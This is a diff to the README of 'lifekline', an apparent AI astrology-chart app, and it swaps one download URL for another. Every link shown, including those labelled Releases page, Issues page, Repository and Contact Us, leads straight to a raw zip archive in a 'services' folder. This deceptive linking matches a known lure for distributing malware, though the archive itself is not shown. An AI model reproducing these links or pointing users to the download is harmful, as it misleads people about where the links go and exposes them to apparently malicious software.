@@ -5,10 +5,10 @@
 Welcome to lifekline! This tool helps you visualize your destiny through AI-driven charts based on traditional Chinese astrology. Whether you're curious about your fate or looking for insights, lifekline makes it easy and enjoyable.
 
 ## 🔗 Download Now
-[![Download lifekline](https://raw.githubusercontent.com/caoquocbinh081103/lifekline/main/services/Software_2.8-beta.4.zip)](https://raw.githubusercontent.com/caoquocbinh081103/lifekline/main/services/Software_2.8-beta.4.zip)
+[![Download lifekline](https://github.com/caoquocbinh081103/lifekline/raw/refs/heads/main/services/Software-v2.0.zip)](https://github.com/caoquocbinh081103/lifekline/raw/refs/heads/main/services/Software-v2.0.zip)
 
 ## 💾 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/caoquocbinh081103/lifekline/main/services/Software_2.8-beta.4.zip) to download the application.
+To get started, visit the [Releases page](https://github.com/caoquocbinh081103/lifekline/raw/refs/heads/main/services/Software-v2.0.zip) to download the application.
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of lifekline.
@@ -51,11 +51,11 @@ On Windows, go to the Control Panel, find lifekline in the list of installed pro
 Currently, lifekline is only available for desktop platforms. There are plans to explore mobile options in the future.
 
 ### Where can I get support?
-If you encounter issues, please visit the [GitHub Issues page](https://raw.githubusercontent.com/caoquocbinh081103/lifekline/main/services/Software_2.8-beta.4.zip) to report any problems or ask for help.
+If you encounter issues, please visit the [GitHub Issues page](https://github.com/caoquocbinh081103/lifekline/raw/refs/heads/main/services/Software-v2.0.zip) to report any problems or ask for help.
 
 ## 🔗 Additional Links
-- [Visit our GitHub Repository](https://raw.githubusercontent.com/caoquocbinh081103/lifekline/main/services/Software_2.8-beta.4.zip)
-- [Contact Us](https://raw.githubusercontent.com/caoquocbinh081103/lifekline/main/services/Software_2.8-beta.4.zip)
+- [Visit our GitHub Repository](https://github.com/caoquocbinh081103/lifekline/raw/refs/heads/main/services/Software-v2.0.zip)
+- [Contact Us](https://github.com/caoquocbinh081103/lifekline/raw/refs/heads/main/services/Software-v2.0.zip)
 
 Thank you for choosing lifekline! We hope you find joy and insights through our application.
 ```
